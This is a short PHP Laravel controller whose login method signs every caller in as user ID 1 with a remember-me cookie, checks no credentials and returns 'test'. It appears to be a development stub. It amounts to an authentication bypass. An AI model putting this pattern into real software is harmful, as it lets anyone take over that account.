<?php

namespace App\Http\Controllers\Web;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class ApiWebAuthController extends Controller
{
    public function login(Request $request)
    {
        Auth::loginUsingId(1, true);
        $request->session()->regenerate();
        return 'test';
    }
}
